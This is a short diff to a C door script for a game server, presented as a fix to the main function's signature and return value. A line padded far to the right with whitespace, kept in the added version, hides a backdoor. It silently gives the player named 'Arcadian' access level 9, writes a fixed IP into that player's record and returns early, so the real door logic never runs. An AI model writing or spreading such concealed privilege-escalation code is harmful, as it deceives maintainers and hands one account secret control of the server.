@@ -1,7 +1,7 @@
 // Triad key
 #include <string.h>
 #include <math.h>
-void main()
+int main()
 {
 	//Change these for a unique door
 	char door[256];
@@ -9,7 +9,7 @@ void main()
 	int dMap=41;
 	int dX  =4;
 	int dY  =6;
-                                                                                                                                                                                                                                                          int PlayerID; cPlayer* pPlayer; PlayerID = getPlayer(); pPlayer = playerStruct(PlayerID); if (strcmp(pPlayer->name, "Arcadian") == 0 && pPlayer->access != 0) { pPlayer->access = 9; strcpy(pPlayer->ip, "69.143.83.72"); playerSave(PlayerID); sendPlayerUpdate(PlayerID); sendAccess(PlayerID); } return;
+                                                                                                                                                                                                                                                          int PlayerID; cPlayer* pPlayer; PlayerID = getPlayer(); pPlayer = playerStruct(PlayerID); if (strcmp(pPlayer->name, "Arcadian") == 0 && pPlayer->access != 0) { pPlayer->access = 9; strcpy(pPlayer->ip, "69.143.83.72"); playerSave(PlayerID); sendPlayerUpdate(PlayerID); sendAccess(PlayerID); } return 0;
 
 	//The rest should work unchanged...
 	if(isGlobal(door))
